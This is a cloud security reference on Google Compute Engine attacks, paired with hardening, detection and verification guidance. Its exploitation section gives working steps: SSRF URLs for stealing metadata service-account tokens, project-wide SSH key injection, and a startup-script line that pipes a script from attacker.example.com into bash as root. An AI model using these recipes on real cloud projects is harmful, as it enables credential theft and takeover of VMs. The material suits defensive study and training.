# GCE and Compute Attacks

Google Cloud Platform security reference: how Compute Engine instances become compromised, how to abuse the metadata server and attached service accounts, and how to detect and prevent compute-level attacks.

## 1. Overview

Google Compute Engine (GCE) is Google's virtual machine service. From an attacker's perspective, a GCE instance is the most direct path to a service account: every instance has a metadata server at `http://metadata.google.internal/` that returns an access token for its attached service account. If an attacker can execute code on the instance (via SSRF, application RCE, misconfigured SSH, or a startup-script injection), the metadata token is one `curl` away.

Three compute primitives dominate GCP attacks:

- **Metadata server** - `http://metadata.google.internal/` and `http://169.254.169.254/`. Returns tokens, instance attributes, project attributes, and SSH keys.
- **Attached service account** - every instance can have one SA attached. The SA's permissions are determined by its IAM bindings, not by the instance.
- **Instance metadata (custom)** - arbitrary key-value pairs. Often used to store secrets (DB passwords, API keys) and to configure startup scripts.

The defensive mirror is straightforward: disable the default SA, restrict metadata access, and treat any code execution on a GCE instance as equivalent to compromising the attached SA.

## 2. Reconnaissance and Enumeration

### 2.1 Unauthenticated enumeration

An external IP alone reveals little, but a few signals are useful:

- **DNS** - `*.c.<project>.internal` and `*.googleusercontent.com` hostnames identify GCP-hosted services.
- **TLS certificates** - `subjectAltName` often contains the project ID (`<project>.appspot.com`, `<project>.run.app`).
- **HTTP headers** - `Server: Google Frontend` and `Via: 1.1 google` indicate GCP-fronted services.
- **Default ports** - GCE instances often expose SSH (22), HTTP (80), HTTPS (443), and application ports.

### 2.2 Authenticated enumeration

With any valid credential:

```bash
gcloud compute instances list --project=<PROJECT_ID>
gcloud compute instances describe <INSTANCE_NAME> --zone=<ZONE> --format="json(serviceAccounts,networkInterfaces,metadata,disks)"
gcloud compute firewall-rules list --project=<PROJECT_ID>
gcloud compute networks list --project=<PROJECT_ID>
```

Expected output (trimmed):

```json
{"serviceAccounts":[{"email":"default-compute@<project>.iam.gserviceaccount.com","scopes":["https://www.googleapis.com/auth/cloud-platform"]}],"metadata":{"items":[{"key":"startup-script","value":"..."}]}}
```

`scopes: cloud-platform` means the SA token has full access to every API the SA's IAM policy allows. Combined with `roles/editor`, this is a full-project compromise.

### 2.3 Enumerate metadata from inside

From a shell on the instance:

```bash
curl -s -H "Metadata-Flavor: Google" "http://metadata.google.internal/computeMetadata/v1/?recursive=true" | jq .
```

Expected output (trimmed):

```json
{
  "instance": {
    "service-accounts": ["default-compute@<project>.iam.gserviceaccount.com"],
    "attributes": {"ssh-keys": "..."},
    "network-interfaces": [...]
  },
  "project": {
    "project-id": "<project>",
    "attributes": {"ssh-keys": "..."}
  }
}
```

Project-level `ssh-keys` attributes apply to every instance in the project. A single leaked key grants SSH to every VM.

## 3. Common Attack Vectors

| Vector | Mechanism | Impact |
|--------|-----------|--------|
| Metadata server SSRF | App fetches attacker URL, redirects to metadata | SA token exfiltration |
| Metadata server access via SSRF in proxy | Open proxy forwards to `metadata.google.internal` | SA token exfiltration |
| Metadata token theft | Application reads metadata for its own use, logs it | SA token in logs |
| Startup script injection | Attacker controls a metadata value used in a startup script | Code execution on new VMs |
| SSH key injection | `compute.instances.setMetadata` on the project | SSH to every VM |
| Over-permissive SA | Instance has `roles/editor` | Full project access from a single VM |
| Public-facing service RCE | App vulnerability on a GCE VM | Initial access, then metadata token |

The metadata server SSRF is the most common GCP-specific escalation. It is the GCP equivalent of the AWS SSRF-to-IMDSv1 path, and it appears in every major GCP breach report involving an application.

## 4. Exploitation Recipes

### 4.1 Metadata server via SSRF

Given an SSRF that allows arbitrary URLs, target the metadata endpoint:

```bash
# Direct SSRF
http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token

# If the SSRF cannot set custom headers, use the alternative metadata IP
http://169.254.169.254/computeMetadata/v1/instance/service-accounts/default/token
```

Both require the `Metadata-Flavor: Google` header for token endpoints. Some SSRF sinks allow header injection; others do not. If the header cannot be added, the SSRF is limited to attributes that are readable without the header (older GCE instances expose some).

Expected output (trimmed):

```text
{"access_token":"ya29.c.xxxxx","expires_in":3599,"token_type":"Bearer"}
```

Use the token against the GCP API:

```bash
curl -s -H "Authorization: Bearer ya29.c.xxxxx" "https://cloudresourcemanager.googleapis.com/v1/projects"
curl -s -H "Authorization: Bearer ya29.c.xxxxx" "https://www.googleapis.com/compute/v1/projects/<PROJECT_ID>/zones/<ZONE>/instances"
```

### 4.2 SSH key injection at the project level

If you have `compute.projects.setCommonInstanceMetadata` (or `compute.instances.setMetadata` on a specific instance):

```bash
gcloud compute project-info add-metadata --metadata="ssh-keys=attacker:$(cat ~/.ssh/id_rsa.pub)"
gcloud compute ssh <INSTANCE_NAME> --zone=<ZONE> --project=<PROJECT_ID>
```

Expected output (trimmed):

```text
Updated [https://www.googleapis.com/compute/v1/projects/<PROJECT_ID>].
Welcome to Ubuntu 22.04 LTS ...
attacker@instance:~$
```

Project-level SSH key injection is the most direct way to get a shell on every instance in the project. It only requires metadata write permission, which is often granted to CI/CD service accounts.

### 4.3 Startup script injection

If the project uses a metadata value in a startup script that runs on every new VM, and you can write to that metadata, you control code that runs on boot:

```bash
gcloud compute project-info add-metadata --metadata="startup-script=#!/bin/bash\ncurl http://attacker.example.com/shell.sh | bash"
gcloud compute instances create test-instance --zone=<ZONE> --image-family=debian-11 --image-project=debian-cloud --scopes=cloud-platform
```

The new instance runs the attacker script as root on first boot. Even if the instance is short-lived, the script can call the metadata server and exfiltrate the attached SA token, or add a persistent attacker SSH key.

### 4.4 Use a stolen SA token

If you have a token from an over-permissive service account:

```bash
curl -s -H "Authorization: Bearer <TOKEN>" "https://compute.googleapis.com/compute/v1/projects/<PROJECT_ID>/aggregated/instances" | jq '.items'
curl -s -H "Authorization: Bearer <TOKEN>" "https://www.googleapis.com/storage/v1/b?project=<PROJECT_ID>" | jq '.items[].name'
```

Expected output (trimmed):

```json
{"items":{"zones/us-central1-a":{"instances":[{"name":"web-01",...}]}}}
{"items":[{"name":"acme-backup",...},{"name":"acme-assets",...}]}
```

## 5. Post-Exploitation

Once you have code execution on a GCE instance, the usual goals are:

- **Token exfiltration** - read the metadata token and use it against the GCP API. The token is valid for 1 hour; persistence requires refreshing it or installing a long-lived key.
- **SSH key injection** - add an attacker key to the instance or to the project. Project-level is more persistent (survives instance deletion) and more dangerous (applies to every new instance).
- **Startup script injection** - write a startup script that runs on every new instance, ensuring persistence across instance recreation.
- **Instance image tampering** - create a new image from a compromised instance, or modify an existing image used by other instances.
- **Lateral movement** - use the SA token to reach other GCP services (Cloud Storage, Secret Manager, BigQuery, Cloud SQL).

## 6. Preventive Controls

- **Disable the default compute service account** - do not attach the default SA to new instances. Create a dedicated SA per workload with the minimum roles.
- **Use `--no-service-account`** - instances that do not need GCP API access should not have an SA attached. `gcloud compute instances create --no-service-account --no-scopes` enforces this.
- **Restrict metadata access** - set `metadata.google.internal` to require the `Metadata-Flavor: Google` header (default, but verify on custom images) and block egress to `169.254.169.254` at the network layer for workloads that do not need it.
- **Metadata concealment (legacy)** - on older GCE instances, `--metadata concealment` hides the SA token from the metadata server. This is deprecated in favor of Workload Identity Federation and short-lived tokens.
- **Workload Identity Federation** - external workloads (GitHub Actions, AWS) should federate into GCP without a key. This eliminates the primary persistence vector.
- **Project-level SSH key management** - restrict `compute.projects.setCommonInstanceMetadata` to a small set of identities. Project-level keys apply to every VM.
- **Organization policy `constraints/compute.vmExternalIpAccess`** - restrict external IPs to specific instances. Reduces the attack surface for initial access.
- **Organization policy `constraints/compute.requireOsLogin`** - enforce OS Login, which centralizes SSH key management and removes project-level SSH keys entirely.
- **VPC Service Controls** - wrap compute in a perimeter so a stolen token cannot exfiltrate data outside the perimeter.

## 7. Detection Controls

- **Admin Activity logs** - always on. Watch for:
  * `compute.projects.setCommonInstanceMetadata` (project SSH keys)
  * `compute.instances.setMetadata` (instance SSH keys or startup scripts)
  * `compute.instances.setServiceAccount`
  * `compute.instances.create` (new instances from untrusted images)
  * `compute.images.create` / `compute.images.setIamPolicy`
- **Metadata server access from unexpected processes** - correlate with process execution logs if available. A web server (nginx, Apache) calling `metadata.google.internal` is a strong signal of SSRF.
- **Data access logs on the metadata API** - metadata server access does not appear in Cloud Audit Logs, but the API calls made with the resulting token do. Alert on SA token usage from an IP that has never used that SA before.
- **VPC Flow Logs** - detect egress from a GCE instance to `169.254.169.254` from unexpected processes. Also detect egress to unfamiliar external IPs (exfiltration).
- **Security Command Center** - built-in detectors for instances with default SAs, instances with external IPs, and instances without OS Login.
- **Serial console logs** - enable serial port logging and alert on unfamiliar startup-script errors or attacker-controlled commands.

## 8. Verification

To verify that the controls are in place across a project:

```bash
# 1. No instance uses the default compute SA
gcloud compute instances list --project=<PROJECT_ID> --format="table(name,zone,serviceAccounts[].email)" | grep -E "default-compute|default.*@"

# 2. No instance has an external IP
gcloud compute instances list --project=<PROJECT_ID> --format="table(name,networkInterfaces[].accessConfigs[].natIP)"

# 3. Project-level SSH keys are absent or minimal
gcloud compute project-info describe --project=<PROJECT_ID> --format="json(commonInstanceMetadata)"

# 4. OS Login is enforced
gcloud resource-manager org-policies describe constraints/compute.requireOsLogin --project=<PROJECT_ID>
```

Expected: no output from step 1 (or only known exceptions); step 2 shows no external IPs; step 3 shows no `ssh-keys` attribute; step 4 shows the policy enforced.

## 9. Cloud-Specific Considerations

- **Short-lived tokens are the new default** - GCE metadata tokens are valid for 1 hour. Persistence after initial access requires either a long-lived SA key or a way to refresh the token (e.g. persistence on the instance).
- **Instance identity** - an instance is identified by its SA, not by its name. Deleting and recreating the instance does not change the SA, so a compromised SA remains compromised across instance lifecycle events.
- **Shielded VMs** - Secure Boot, vTPM, and integrity monitoring. Shielded VMs prevent kernel-level bootkits but do not prevent application-level RCE and metadata token theft.
- **Confidential VMs** - memory encryption at rest and in use. Protects against physical host attacks but not against in-guest RCE.
- **Sole-tenant nodes** - dedicated physical hosts. Reduces noisy-neighbor risk but does not change the metadata server threat model.
- **Nested virtualization** - if enabled, an instance can run its own hypervisor. This changes the attack surface (VM escape into the GCE guest, not into the host).

## 10. Production Notes

- Never attach the default compute SA. Create a dedicated SA per workload, with the minimum roles and a name that reflects its purpose.
- Use `--no-service-account --no-scopes` on instances that do not need GCP API access. Most web servers do not.
- Enforce OS Login at the org level. This removes project-level SSH keys and centralizes key management.
- Restrict `compute.projects.setCommonInstanceMetadata` to a single, monitored identity (a Terraform service account). Audit any change to project metadata.
- Enable VPC Flow Logs and alert on traffic to `169.254.169.254` from non-metadata-client processes. This is the GCP equivalent of detecting SSRF via IMDS.
- Rotate instance images on a schedule. A compromised image propagates to every instance created from it.
- Monitor for new instance creation outside Terraform. New instances with default SAs or external IPs are a strong signal of either accidental exposure or compromise.

## 11. References

- Compute Engine security - https://cloud.google.com/compute/docs/security
- Metadata server - https://cloud.google.com/compute/docs/metadata/overview
- Service accounts for Compute Engine - https://cloud.google.com/compute/docs/access/service-accounts
- OS Login - https://cloud.google.com/compute/docs/oslogin
- Organization policy constraints - https://cloud.google.com/resource-manager/docs/organization-policy/org-policy-constraints
- VPC Service Controls - https://cloud.google.com/vpc-service-controls/docs/overview

## Certification Alignment

- **Google Cloud Professional Cloud Security Engineer** - GCE hardening, metadata server restrictions, OS Login, org policies.
- **Google Cloud Associate Cloud Engineer** - instance creation, metadata, SSH access.
- **Google Cloud Professional Cloud Architect** - instance design, SA per workload, network segmentation.
- **CompTIA Security+** - endpoint security, credential protection, network segmentation.
